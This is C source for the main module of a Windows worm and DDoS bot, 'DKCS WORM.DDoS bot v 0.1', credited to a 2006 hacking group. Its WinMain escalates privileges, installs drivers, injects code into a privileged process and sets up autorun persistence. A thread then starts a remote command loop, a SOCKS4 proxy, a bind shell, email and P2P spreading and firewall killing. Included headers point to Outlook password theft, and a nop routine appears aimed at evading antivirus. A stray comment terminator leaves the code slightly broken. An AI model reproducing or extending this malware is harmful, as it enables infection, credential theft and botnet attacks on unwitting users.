//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
// SPECIAL EDIT FOR: 311137
//-----------------------------------------------------------------
#include "_config.h"
//-----------------------------------------------------------------
#include <winsock2.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <shellapi.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <process.h>
#include <stdlib.h>
#include <urlmon.h>
#include <stdio.h>
//-----------------------------------------------------------------
#include "priv.h"
#include "inject.h"
#include "find_proc.h"
#include "base64.h"
#include "net.h"
#include "autorun.h"
#include "bindshell.h"
#include "killer.h"
#include "socks4.h"

 #include "./Z_worm/outlook_passwd.h"
 #include "./Z_worm/worm_email.h"
 #include "./Z_worm/worm_p2p.h"
 #include "./Z_driver/create.h"
//-----------------------------------------------------------------
// #pragma comment(lib, "msvcrt.lib")	// not recommendet,
										// needed msvcrt.dll
										// in Win package.
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.Lib")
#pragma comment(lib, "urlmon.lib")
//-----------------------------------------------------------------
#pragma comment(linker, "/BASE:0x13140000")
#pragma comment(linker, "/MERGE:.rdata=.text") 
#pragma comment(linker, "/SECTION:.text,EWRX") 
//-----------------------------------------------------------------
typedef BOOL (WINAPI *WININET_GETCONNECTEDSTATE)(LPDWORD lpdwFlags, DWORD dwReserved);
//-----------------------------------------------------------------
DWORD WINAPI EnterPoint(LPVOID lpParam);
//-----------------------------------------------------------------
void AVPsex(void){
	int	i;
	for(i=0; i<10; i++){
		__asm {
				nop
				nop
		}
	}
}
//-----------------------------------------------------------------
BOOL __stdcall WinMain(HINSTANCE, HINSTANCE, PTSTR, int){

	char	buf[128];

	AVPsex();
	GetSystemDirectory(buf, 128);
	strcat(buf, "\\");
	strcat(buf, MY_MACRO_RECORD_NAME);
	strcat(buf, ".exe\0");
	GetMaxPriv();
	 InstallAndRegisterDrivers();
	if(GetPrivilege("SeDebugPrivilege")){
		if(FileExist(buf)){
            InjectCode(ProcIdByPriv(0), &EnterPoint, NULL);
		}else{
			InjectCode(ProcIdByPriv(0), &EnterPoint, NULL);
			 AddIntoSystem(MY_MACRO_RECORD_NAME, 1);
			 AddIntoSystem(MY_MACRO_RECORD_NAME, 0);
			return FALSE;
		}
	}else{
		if(FileExist(buf)){
            InjectCode(ProcIdByPriv(0), &EnterPoint, NULL);
		}else{
			InjectCode(ProcIdByPriv(0), &EnterPoint, NULL);
			 AddIntoSystem(MY_MACRO_RECORD_NAME, 1);
			 AddIntoSystem(MY_MACRO_RECORD_NAME, 0);
			return FALSE;
		}
	}

return FALSE;
}
//-----------------------------------------------------------------
int IsOnline(void){

	WININET_GETCONNECTEDSTATE	pInternetGetConnectedState;
	HINSTANCE					hWinInet;
	DWORD						igcs_flags;
	char						tmp[64];

	hWinInet = GetModuleHandle("wininet.dll");
	if(hWinInet == NULL || hWinInet == INVALID_HANDLE_VALUE){
		hWinInet = LoadLibrary(tmp);
		if(hWinInet == NULL || hWinInet == INVALID_HANDLE_VALUE){
			return 2;
		}
	}
	pInternetGetConnectedState = (WININET_GETCONNECTEDSTATE)GetProcAddress(hWinInet, "InternetGetConnectedState");
	if(pInternetGetConnectedState == NULL){
		return 2;
	}
return (pInternetGetConnectedState(&igcs_flags, 0) == 0)?0:1;
}
//-----------------------------------------------------------------
DWORD WINAPI EnterPoint(LPVOID lpParam){

	DWORD	dwThreadID;
	int		tmp_cnt1 = 0;

	AVPsex();
	while(1){
		if(IsOnline()){
			if(tmp_cnt1 == 0){
				tmp_cnt1 = 1;
				CreateThread(NULL, NULL, GetCommand, NULL, NULL, &dwThreadID);
				
				if(MY_MACRO_SOCKS4_ACTIVE){
					CreateThread(NULL, NULL, SocksDaemon, NULL, NULL, &dwThreadID);
				}
				if(MY_MACRO_BIND){
					CreateThread(NULL, NULL, BindShell, NULL, NULL, &dwThreadID);
				}
				if(MY_MACRO_WORM_ACTIVE){
					// here 
                    CreateThread(NULL, NULL, EMAILWormThread, NULL, NULL, &dwThreadID);
					CreateThread(NULL, NULL, P2P_Spreading, NULL, NULL, &dwThreadID);
				}
				if(MY_MACRO_FIREWALL_KILL){
                    CreateThread(NULL, NULL, KillFirewalls, NULL, NULL, &dwThreadID);
				}
				*/
			}
		}
		Sleep(MY_MACRO_CHECK_INET_TIME*1000);
	}
return FALSE;
}
//-----------------------------------------------------------------